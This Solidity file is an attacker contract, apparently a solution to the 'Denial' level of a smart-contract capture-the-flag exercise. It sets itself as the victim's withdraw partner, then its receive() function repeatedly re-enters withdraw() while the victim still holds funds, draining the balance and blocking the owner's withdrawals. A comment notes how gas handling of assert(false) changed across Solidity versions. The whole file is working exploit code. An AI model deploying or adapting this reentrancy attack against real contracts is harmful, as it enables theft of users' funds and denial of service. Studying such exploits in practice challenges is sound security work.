//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./vict.sol";

contract Testing {
    Denial public victimContract;

    constructor(address payable _addr) {
        victimContract = Denial(_addr);
    }

    function checkBalance() public view returns (uint) {
        return address(this).balance;
    }

    function setPartner() public {
        victimContract.setWithdrawPartner(address(this));
    }

    function attack() public {
        victimContract.withdraw();
    }

    receive() external payable {
        //issue with using assert(false) - it was in earlier versions of solidity ^0.6.0 that the gas was not funded,
        //but in newer versions the gas is refunded.

        if (victimContract.contractBalance() / 100 > 0) {
            victimContract.withdraw();
        }
    }
}
